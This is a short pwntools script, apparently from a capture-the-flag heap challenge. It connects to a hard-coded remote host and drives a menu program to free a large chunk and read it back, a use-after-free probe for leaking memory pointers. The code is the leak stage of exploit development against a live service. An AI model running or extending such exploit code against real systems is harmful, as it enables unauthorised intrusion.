import re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "144.79.188.39", 40838

def test_leak_size():
    io = remote(HOST, PORT, timeout=8)
    def menu(c): io.sendlineafter(b"> ", str(c).encode())
    def create(idx, size, data):
        menu(1)
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.sendlineafter(b"Size: ", str(size).encode())
        io.sendafter(b"Data: ", data)
    def readn(idx, n):
        menu(2)
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.recvuntil(b"Data: ")
        return io.recvn(n)
    def delete(idx):
        menu(4)
        io.sendlineafter(b"Index: ", str(idx).encode())

    # Size 0x418 vs 0x420
    create(0, 0x420, b"X"*0x420)
    create(1, 0x20, b"Y"*0x20)
    delete(0)
    res = readn(0, 16)
    print("Size 0x420 result:", res.hex())
    io.close()

if __name__ == "__main__":
    test_leak_size()
